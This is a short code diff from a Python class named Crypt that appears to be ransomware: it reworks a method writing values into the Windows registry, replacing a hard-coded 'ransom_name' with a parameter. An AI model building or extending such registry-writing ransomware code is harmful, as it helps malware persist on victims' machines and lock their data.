@@ -57,15 +57,15 @@ class Crypt:
             SetValueEx(winkey, ' ', 0, REG_SZ, binkey)
         return 0
 
-    def registry_key(self, keypath: str, value):
+    def registry_key(self, keypath: str, value, name: str):
         # Registry a key in Windows registry using the keypath and the value provided
         key = CreateKey(HKEY_LOCAL_MACHINE, keypath)
         try:
-            SetValueEx(key, self.ransom_name, 0, REG_SZ, value)
+            SetValueEx(key, name, 0, REG_SZ, value)
             CloseKey(key)
         except PermissionError:
             key = CreateKey(HKEY_CURRENT_USER, keypath)
-            SetValueEx(key, self.ransom_name, 0, REG_SZ, value)
+            SetValueEx(key, name, 0, REG_SZ, value)
             CloseKey(key)
         return 0
 
